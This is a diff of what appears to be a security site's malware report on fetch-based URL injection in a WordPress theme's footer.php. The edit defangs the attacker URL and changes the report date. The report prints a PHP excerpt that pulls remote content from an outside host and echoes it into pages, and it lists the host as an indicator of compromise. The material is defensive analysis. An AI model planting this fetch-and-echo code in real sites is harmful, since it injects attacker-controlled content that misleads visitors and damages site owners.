@@ -1,7 +1,7 @@
 ---
 title: 'Fetch-Based URL Injection'
 slug: 'fetch-based-url-injection'
-reportDate: '2026-01-24'
+reportDate: '2026-01-22'
 threatType: 'URL Injection'
 severity: 'High'
 fileHash: 'seo-spam-footer-injection'
@@ -41,7 +41,7 @@ The malware is embedded in the theme's footer.php file. It uses the fetch functi
 
 ```php
 <?php
-$url = "https://nawalaku.my.id/bl/";
+$url = "hxxps://nawalaku[.]my[.]id/bl/";
 
 function fetch($url) {
     if (ini_get('allow_url_fopen') && ($d = @file_get_contents($url))) return $d;
@@ -80,7 +80,7 @@ echo fetch($url);
 
 ## Indicators of Compromise (IOCs)
 
-- `https://nawalaku.my.id/bl/`
+- `hxxps://nawalaku[.]my[.]id/bl/`
 - `fetch function`
 - `CURLOPT_USERAGENT`
 
